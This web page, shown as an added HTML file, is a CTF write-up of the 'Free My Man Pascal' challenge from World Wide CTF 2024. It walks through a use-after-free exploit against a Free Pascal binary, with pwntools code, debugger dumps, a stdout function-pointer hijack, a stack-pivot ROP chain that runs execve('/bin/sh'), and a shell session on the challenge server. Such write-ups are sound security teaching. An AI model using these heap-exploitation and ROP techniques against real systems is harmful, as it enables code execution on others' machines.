@@ -1,0 +1,347 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="theme-color" content="#2ecc71">
+
+
+
+
+
+<title>World Wide CTF 2024 - Free My Man Pascal | kileak</title>
+
+
+
+
+
+<meta name="description" content="World Wide CTF 2024 - Free My Man Pascal">
+
+
+<meta name="keywords" content="wwctf, ctfreg">
+
+
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+
+
+
+
+
+
+<link rel="canonical" href="https://kileak.github.io/ctf/2024/wwctf2024-freemymanpascal-copy/">
+<link rel="alternate" type="application/rss+xml" title="kileak" href="https://kileak.github.io/feed.xml" />
+
+
+
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-4PGFKKP0QW"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-4PGFKKP0QW');
+</script>
+
+
+<script>base_url = "";</script>
+
+  </head>
+  <body class="">
+
+    <main class="main-container">
+
+        <header class="site-header">
+
+  <div class="container txt-center">
+    <a href="#" class="nav-toogle js-menu-trigger sliding-panel-button">
+      <span></span>
+      <span></span>
+      <span></span>
+    </a>
+
+    <nav class="js-menu sliding-panel-content">
+      <ul>
+        <li><a href="/">home</a></li>
+        <li><a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank">youtube</a></li>
+        <li><a href="/feed.xml" target="_blank"><i class="icon icon-feed"></i> feed</a></li>
+      </ul>
+    </nav>
+    <div class="js-menu-screen sliding-panel-fade-screen"></div>
+
+    <a href="/" class="author-thumb dot">
+      <img src="/images/author.jpg" alt="Author thumbnail" class="dot">
+    </a>
+
+    <!--
+    <a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank" class="youtube-thumb dot">
+      <img src="/images/youtube-icon.png" alt="Youtube" class "dot">
+    </a>
+    -->
+
+    
+      <h1 class="post-title">World Wide CTF 2024 - Free My Man Pascal</h1>
+      <p class="post-meta">Nov 24, 2024</p>
+    
+
+  </div>
+
+</header>
+
+
+        <section class="main-content">
+          <article class="post">
+
+  <div class="post-content container">
+    <blockquote>
+  <p>World Wide CTF 2024 - Free My Man Pascal
+<!--break-->
+Free My Man Pascal</p>
+
+  <p>500 / medium</p>
+
+  <p>Author: numb3rs</p>
+
+  <p>plz free pascal</p>
+
+  <p>nc freemyman.chal.wwctf.com 1337</p>
+
+  <p>Team: Weak But Leet</p>
+
+  <p>Attachment: 
+<a href="https://kileak.github.io/assets/wwctf24/freepascal/freemyman">freemyman</a> 
+<a href="https://kileak.github.io/assets/wwctf24/freepascal/xpl.py">xpl.py</a></p>
+</blockquote>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">Free My Man Pascal
+==================================
+1. Add a request
+2. Edit a request
+3. Show a request
+4. Delete a request
+5. Add data
+6. Exit
+&gt;&gt; </code></pre></figure>
+
+<p>From the functions defined and the challenge name, this challenge seemed to be written in <code class="language-plaintext highlighter-rouge">Free Pascal</code>. Didn’t really invest much time into reversing it, but just assumed, that it will be some use-after-free kind of vulnerability and just went on dynamically debugging it.</p>
+
+<p>And from some quick tests, it seemed that this was indeed the case.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt;&gt; "</span><span class="p">)</span>
+<span class="n">add</span><span class="p">(</span><span class="sa">b</span><span class="s">"A"</span> <span class="o">*</span> <span class="mh">0x10</span><span class="p">,</span> <span class="sa">b</span><span class="s">"B"</span> <span class="o">*</span> <span class="mh">0x10</span><span class="p">)</span>
+<span class="n">add</span><span class="p">(</span><span class="sa">b</span><span class="s">"A"</span> <span class="o">*</span> <span class="mh">0x10</span><span class="p">,</span> <span class="sa">b</span><span class="s">"B"</span> <span class="o">*</span> <span class="mh">0x10</span><span class="p">)</span>
+
+<span class="n">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">free</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+
+<span class="n">LEAK</span> <span class="o">=</span> <span class="n">view</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+<span class="k">print</span><span class="p">(</span><span class="n">hexdump</span><span class="p">(</span><span class="n">LEAK</span><span class="p">))</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">[+] Starting local process './freemyman': pid 325099
+[325099]
+[*] Paused (press any to continue)
+00000000  12 fb f7 ff  7f 00 00 78  11 fb f7 ff  7f 00 00 41  │····│···x│····│···A│
+00000010  00 00 00 00  00 00 00 00  0a 0d 42 42  42 42 42 42  │····│····│··BB│BBBB│
+00000020  42 42 42 42  42 42 42 42  42 42 0a 0d               │BBBB│BBBB│BB··│
+0000002c</code></pre></figure>
+
+<p>It seems that for the freed pointer we don’t control the LSB (only bytes 1-6), so we don’t have “full” control over it when overwriting it, but we can use it to shove the next chunks around a bit…</p>
+
+<p>Since we can edit the freed chunk again, we can just overwrite the next free pointer in the chunk and let it point somewhere else.</p>
+
+<p>I thought about overwriting some <code class="language-plaintext highlighter-rouge">exitfuncs</code> kind of structure and after testing out some of the global function pointers, I stumbled across <code class="language-plaintext highlighter-rouge">U_$SYSTEM_$$_STDOUT</code> as a working target.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">0x483600 &lt;U_$SYSTEM_$$_STDOUT&gt;:	0x0000000000000000	0x0000d7b200000001
+0x483610 &lt;U_$SYSTEM_$$_STDOUT+16&gt;:	0x0000000000000100	0x0000000000000000
+0x483620 &lt;U_$SYSTEM_$$_STDOUT+32&gt;:	0x0000000000000000	0x0000000000000000
+0x483630 &lt;U_$SYSTEM_$$_STDOUT+48&gt;:	0x000000000048387c	0x000000000041c580
+0x483640 &lt;U_$SYSTEM_$$_STDOUT+64&gt;:	0x000000000041c520	0x000000000041c520 
+0x483650 &lt;U_$SYSTEM_$$_STDOUT+80&gt;:	0x000000000041c4d0	0x0000000000000000
+0x483660 &lt;U_$SYSTEM_$$_STDOUT+96&gt;:	0x0000000000000000	0x0000000000000000
+0x483670 &lt;U_$SYSTEM_$$_STDOUT+112&gt;:	0x0000000000000000	0x0000000000000000
+0x483680 &lt;U_$SYSTEM_$$_STDOUT+128&gt;:	0x0000000000000000	0x0000000000000000
+0x483690 &lt;U_$SYSTEM_$$_STDOUT+144&gt;:	0x0000000000000000	0x0000000000000000</code></pre></figure>
+
+<p>We can allocate another chunk into this and overwrite the function pointers in it. One of those should get triggered when the challenge exists and tries to flush <code class="language-plaintext highlighter-rouge">stdout</code>.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">payload1</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x483618</span><span class="p">)[</span><span class="mi">1</span><span class="p">:</span><span class="mi">8</span><span class="p">]</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span>
+<span class="n">payload2</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xfacebabe</span><span class="p">)</span>
+
+<span class="n">edit</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">payload1</span><span class="p">,</span> <span class="n">payload2</span><span class="p">)</span>
+
+<span class="n">add</span><span class="p">(</span><span class="sa">b</span><span class="s">"A"</span> <span class="o">*</span> <span class="mh">0x10</span><span class="p">,</span> <span class="sa">b</span><span class="s">"B"</span> <span class="o">*</span> <span class="mh">0x10</span><span class="p">)</span></code></pre></figure>
+
+<p>The next chunk would now get allocated into the <code class="language-plaintext highlighter-rouge">stdout</code> structure. Let’s see, what will happen, if we just fill it up with garbage.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic_metasploit</span><span class="p">(</span><span class="mh">0x40</span><span class="p">)</span>
+<span class="n">payload2</span> <span class="o">=</span> <span class="n">cyclic_metasploit</span><span class="p">(</span><span class="mh">0x40</span><span class="p">)</span>
+
+<span class="n">add</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="n">payload2</span><span class="p">)</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">Program received signal SIGSEGV, Segmentation fault.
+0x000000000041cc8b in SYSTEM_$$_FLUSH$TEXT ()
+─────────────────────────────────────────────────────────────────────────────────────────────── registers ────
+$rax   : 0x0000000000483d08  →  0x0000000000000000
+$rbx   : 0x0000000000483608  →  0x0000d7b200000001
+$rcx   : 0x0000000000401eb7  →  &lt;SYSTEM_$$_FPSYSCALL$INT64$INT64$INT64$INT64$$INT64+0017&gt; cmp rax, 0xfffffffffffff001
+$rdx   : 0x0               
+$rsp   : 0x00007fffffffd330  →  0x0000000000483988  →  0x0000d7b200000002
+$rbp   : 0x00007fffffffd490  →  0x0000000000000000
+$rsi   : 0x00000000004851f0  →  "Exiting program...\n\r\rfully!\n\r\n\r-2): "
+$rdi   : 0x0000000000483608  →  0x0000d7b200000001
+$rip   : 0x000000000041cc8b  →  &lt;SYSTEM_$$_FLUSH$TEXT+00ab&gt; call QWORD PTR [rbx+0x38]
+$r8    : 0x00007ffff7fb92b0  →  0x0765076507720746
+$r9    : 0x0               
+$r10   : 0x3262413162413062 ("b0Ab1Ab2"?)
+$r11   : 0x206             
+$r12   : 0x0               
+$r13   : 0x0               
+$r14   : 0x0               
+$r15   : 0x0               
+$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
+$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
+──────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
+     0x41cc81 &lt;SYSTEM_$$_FLUSH$TEXT+00a1&gt; mov    WORD PTR [rax], 0x67
+     0x41cc86 &lt;SYSTEM_$$_FLUSH$TEXT+00a6&gt; jmp    0x41cc8e &lt;SYSTEM_$$_FLUSH$TEXT+174&gt;
+     0x41cc88 &lt;SYSTEM_$$_FLUSH$TEXT+00a8&gt; mov    rdi, rbx
+ →   0x41cc8b &lt;SYSTEM_$$_FLUSH$TEXT+00ab&gt; call   QWORD PTR [rbx+0x38]
+     0x41cc8e &lt;SYSTEM_$$_FLUSH$TEXT+00ae&gt; pop    rbx
+     0x41cc8f &lt;SYSTEM_$$_FLUSH$TEXT+00af&gt; ret    
+     0x41cc90 &lt;SYSTEM_$$_ERASE$TEXT+0000&gt; push   rbx
+     0x41cc91 &lt;SYSTEM_$$_ERASE$TEXT+0001&gt; mov    rbx, rdi
+     0x41cc94 &lt;SYSTEM_$$_ERASE$TEXT+0004&gt; lea    rax, [rip+0x68145]        # 0x484de0 &lt;FPC_THREADVAR_RELOCATE&gt;
+
+gef➤  x/gx $rbx+0x38
+0x483640 &lt;U_$SYSTEM_$$_STDOUT+64&gt;:	0x3562413462413362</code></pre></figure>
+
+<p>Looking good, so we control the value at <code class="language-plaintext highlighter-rouge">rbx+0x38</code>. <code class="language-plaintext highlighter-rouge">rdi</code> will point to <code class="language-plaintext highlighter-rouge">stdout+0x8</code> at this point.</p>
+
+<p>We just need a fitting gadget to pivot the stack into our allocated chunk and also to change <code class="language-plaintext highlighter-rouge">rdi</code> to point to a more controllable address.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">0x40296f    
+
+mov edi,DWORD PTR [rdi+0x28]; 
+mov rsp, qword ptr [rdi + 0x30]; 
+jmp qword ptr [rdi + 0x38];</code></pre></figure>
+
+<p>Perfect :)</p>
+
+<p>This will set <code class="language-plaintext highlighter-rouge">rdi</code> to <code class="language-plaintext highlighter-rouge">[rdi+0x28]</code> and <code class="language-plaintext highlighter-rouge">rsp</code> to <code class="language-plaintext highlighter-rouge">[rdi+0x30]</code> and then jump to <code class="language-plaintext highlighter-rouge">[rdi+0x38]</code>. And we control all of those values.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">STACKPIVOT</span> <span class="o">=</span> <span class="mh">0x40296c</span>
+
+<span class="c1"># 0x0000000000402dac: pop rsi; pop r13; pop r12; pop rbx; ret; 
+</span><span class="n">POPRSI3</span> <span class="o">=</span> <span class="mh">0x0000000000402dac</span>
+<span class="n">POPRAX</span> <span class="o">=</span> <span class="mh">0x0000000000413c23</span>
+<span class="n">SYSCALL</span> <span class="o">=</span> <span class="mh">0x0000000000401fa7</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"/bin/sh</span><span class="se">\x00</span><span class="s">"</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x483618</span><span class="p">)</span>         <span class="c1"># X / new rdi
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">STACKPIVOT</span><span class="p">)</span>       <span class="c1"># X / stack pivot
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x483660</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">POPRAX</span><span class="p">)</span>      <span class="c1"># rsp / new jmp
+</span>
+<span class="n">payload2</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span> <span class="o">*</span> <span class="mi">7</span>
+<span class="n">payload2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">59</span><span class="p">)</span>
+<span class="n">payload2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POPRSI3</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">payload2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">payload2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">SYSCALL</span><span class="p">)</span>
+
+<span class="n">add</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="n">payload2</span><span class="p">)</span></code></pre></figure>
+
+<p>Flushing stdout will now trigger our stack pivot, which will set <code class="language-plaintext highlighter-rouge">rdi</code> to <code class="language-plaintext highlighter-rouge">0x483618</code> (the address where we put the <code class="language-plaintext highlighter-rouge">/bin/sh</code> string), set <code class="language-plaintext highlighter-rouge">rsp</code> to <code class="language-plaintext highlighter-rouge">0x483660</code>, where the content of our chunk is stored (<code class="language-plaintext highlighter-rouge">payload2</code>) and then call <code class="language-plaintext highlighter-rouge">rdi+0x38</code>, which is <code class="language-plaintext highlighter-rouge">pop rax; ret</code>.</p>
+
+<p>Since we moved <code class="language-plaintext highlighter-rouge">rsp</code> to the beginning of content, this will now set <code class="language-plaintext highlighter-rouge">rax</code> to <code class="language-plaintext highlighter-rouge">59</code> (<code class="language-plaintext highlighter-rouge">execve</code>) and then clear <code class="language-plaintext highlighter-rouge">rsi</code> and execute <code class="language-plaintext highlighter-rouge">execve("/bin/sh", 0, 0)</code>.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">$ python3 xpl.py  1
+[+] Opening connection to freemyman.chal.wwctf.com on port 1337: Done
+[*] Switching to interactive mode
+Exiting program...
+$ ls
+flag.txt
+freemyman
+$ cat flag.txt
+wwf{P4sc4l_U4f_FTW_174a3f4fa44c7bb22b}</code></pre></figure>
+
+
+    <aside class="share">
+
+      <span>Share this: </span>
+
+      <a href="http://twitter.com/share?text=World Wide CTF 2024 - Free My Man Pascal&amp;url=https://kileak.github.io/ctf/2024/wwctf2024-freemymanpascal-copy/"
+      onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+        <i class="icon icon-twitter-rounded"></i>
+      </a>
+
+      <a href="https://www.facebook.com/sharer/sharer.php?u=https://kileak.github.io/ctf/2024/wwctf2024-freemymanpascal-copy/"
+      onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+        <i class="icon icon-facebook-rounded"></i>
+      </a>
+
+    </aside>
+  </div>
+
+  
+  <hr>
+  <aside id="comments" class="disqus">
+    <div class="container">
+      <h3><i class="icon icon-comments-o"></i> Comments</h3>
+      <div id="disqus_thread"></div>
+
+      <script type="text/javascript">
+        var disqus_shortname = 'kileak';
+        var disqus_identifier = '/ctf/2024/wwctf2024-freemymanpascal copy';
+        var disqus_title = 'World Wide CTF 2024 - Free My Man Pascal';
+        var disqus_url = 'https://kileak.github.io/ctf/2024/wwctf2024-freemymanpascal copy';
+
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+      </script>
+
+      <noscript>
+        Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a>
+      </noscript>
+    </div>
+  </aside>
+
+
+
+</article>
+
+        </section>
+
+        
+<div class="clearfix"></div>
+
+<footer class="site-footer txt-center">
+  <hr>
+
+  <ul class="social">
+    
+  </ul>
+
+  <small>&copy; 2025 All rights reserved. Made with <a href="http://jekyllrb.com" target="_blank">Jekyll</a> and <i class="icon icon-heart"></i></small>
+  <small>by <a href="http://nandomoreira.me" target="_blank">nandomoreira.me</a></small>
+
+</footer>
+
+
+    </main>
+
+    <a href="http://github.com/Kileak" target="_blank" class="github-corner"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#000; color:#fff; position: absolute; top: 0; border: 0; right: 0;"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+    <script src="/js/jquery.min.js"></script>
+    <script src="/js/jekyll-search.min.js"></script>
+    <script src="/js/main.js"></script>
+  </body>
+</html>
